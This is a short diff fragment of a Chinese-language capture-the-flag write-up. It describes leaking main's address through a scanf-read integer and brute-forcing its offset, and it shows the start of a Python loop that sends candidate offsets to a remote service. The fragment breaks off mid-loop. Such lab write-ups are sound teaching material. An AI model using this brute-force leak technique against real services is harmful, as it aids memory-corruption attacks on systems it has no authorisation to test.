@@ -16,6 +16,7 @@ main函数中先是scan了一个int，可以利用它来*泄露main的地址*以
 通过爆破获取main的偏移，如果打印出来的地址以0000结尾，则爆破成功
 
 ```python
+# inserted in the code block below
 for offset in range(8, 128, 8):
     sh = remote(???, 10022)
     sh.sendline(str(offset).encode())
